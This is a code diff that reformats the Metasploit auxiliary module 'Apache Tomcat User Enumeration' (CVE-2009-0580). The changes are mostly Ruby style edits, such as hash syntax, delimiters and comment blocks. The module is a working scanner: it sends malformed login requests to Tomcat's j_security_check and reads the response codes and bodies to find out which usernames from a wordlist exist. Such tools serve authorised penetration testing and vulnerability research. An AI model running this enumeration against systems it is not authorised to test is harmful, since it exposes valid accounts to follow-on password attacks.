@@ -1,14 +1,12 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -17,13 +15,13 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name'           => 'Apache Tomcat User Enumeration',
-      'Description'    => %q{
+      'Description'    => %q(
           This module enumerates Apache Tomcat's usernames via malformed requests to
         j_security_check, which can be found in the web administration package. It should
         work against Tomcat servers 4.1.0 - 4.1.39, 5.5.0 - 5.5.27, and 6.0.0 - 6.0.18.
         Newer versions no longer have the "admin" package by default. The 'admin' package
         is no longer provided for Tomcat 6 and later versions.
-      },
+      ),
       'Author'         =>
         [
           'Heyder Andrade <heyder.andrade[at]gmail.com>',
@@ -33,34 +31,35 @@ class MetasploitModule < Msf::Auxiliary
         [
           ['BID', '35196'],
           ['CVE', '2009-0580'],
-          ['OSVDB', '55055'],
+          ['OSVDB', '55055']
         ],
-      'License'        =>  MSF_LICENSE
+      'License' => MSF_LICENSE
     )
 
     register_options(
       [
         Opt::RPORT(8080),
         OptString.new('TARGETURI', [true, 'The path of the Apache Tomcat Administration page', '/admin/j_security_check']),
-        OptPath.new('USER_FILE',  [ true, "File containing users, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "tomcat_mgr_default_users.txt") ]),
-      ], self.class)
+        OptPath.new('USER_FILE', [ true, "File containing users, one per line",
+                                   File.join(Msf::Config.data_directory, "wordlists", "tomcat_mgr_default_users.txt") ])
+      ], self.class
+    )
 
-    deregister_options('PASS_FILE','USERPASS_FILE','USER_AS_PASS','STOP_ON_SUCCESS','BLANK_PASSWORDS')
+    deregister_options('PASS_FILE', 'USERPASS_FILE', 'USER_AS_PASS', 'STOP_ON_SUCCESS', 'BLANK_PASSWORDS')
   end
 
   def has_j_security_check?
     vprint_status("#{full_uri} - Checking j_security_check...")
-    res = send_request_raw({'uri' => normalize_uri(target_uri.path)})
+    res = send_request_raw('uri' => normalize_uri(target_uri.path))
     if res
-      vprint_status("#{full_uri} - Server returned: #{res.code.to_s}")
-      return true if res.code == 200 or res.code == 302
+      vprint_status("#{full_uri} - Server returned: #{res.code}")
+      return true if (res.code == 200) || (res.code == 302)
     end
 
     false
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     unless has_j_security_check?
       print_error("#{full_uri} - Unable to enumerate users with this URI")
       return
@@ -68,19 +67,19 @@ class MetasploitModule < Msf::Auxiliary
 
     @users_found = {}
 
-    each_user_pass { |user,pass|
+    each_user_pass do |user, _pass|
       do_login(user)
-    }
+    end
 
-    if(@users_found.empty?)
+    if @users_found.empty?
       print_status("#{full_uri} - No users found.")
     else
-      print_good("#{full_uri} - Users found: #{@users_found.keys.sort.join(", ")}")
+      print_good("#{full_uri} - Users found: #{@users_found.keys.sort.join(', ')}")
       report_note(
-        :host => rhost,
-        :port => rport,
-        :type => 'tomcat.users',
-        :data => {:users =>  @users_found.keys.join(", ")}
+        host: rhost,
+        port: rport,
+        type: 'tomcat.users',
+        data: { users: @users_found.keys.join(", ") }
       )
     end
   end
@@ -93,18 +92,19 @@ class MetasploitModule < Msf::Auxiliary
         {
           'method'  => 'POST',
           'uri'     => normalize_uri(target_uri.path),
-          'data'    => post_data,
-        }, 20)
+          'data'    => post_data
+        }, 20
+      )
 
-      if res and res.code == 200 and !res.get_cookies.empty?
+      if res && (res.code == 200) && !res.get_cookies.empty?
         vprint_error("#{full_uri} - Apache Tomcat #{user} not found ")
-      elsif res and res.code == 200 and res.body =~ /invalid username/i
+      elsif res && (res.code == 200) && res.body =~ /invalid username/i
         vprint_error("#{full_uri} - Apache Tomcat #{user} not found ")
-      elsif res and res.code == 500
+      elsif res && (res.code == 500)
         # Based on: http://archives.neohapsis.com/archives/bugtraq/2009-06/0047.html
         vprint_good("#{full_uri} - Apache Tomcat #{user} found ")
         @users_found[user] = :reported
-      elsif res and res.body.empty? and res.headers['Location'] !~ /error\.jsp$/
+      elsif res && res.body.empty? && res.headers['Location'] !~ /error\.jsp$/
         # Based on: http://archives.neohapsis.com/archives/bugtraq/2009-06/0047.html
         print_good("#{full_uri} - Apache Tomcat #{user} found ")
         @users_found[user] = :reported
@@ -118,14 +118,11 @@ class MetasploitModule < Msf::Auxiliary
       return :abort
     end
   end
-
 end
 
-=begin
-
-If your Tomcat doesn't have the admin package by default, download it here:
-http://archive.apache.org/dist/tomcat/	
-
-The package name should look something like: apache-tomcat-[version]-admin.zip
-
-=end
+#
+# If your Tomcat doesn't have the admin package by default, download it here:
+# http://archive.apache.org/dist/tomcat/
+#
+# The package name should look something like: apache-tomcat-[version]-admin.zip
+#
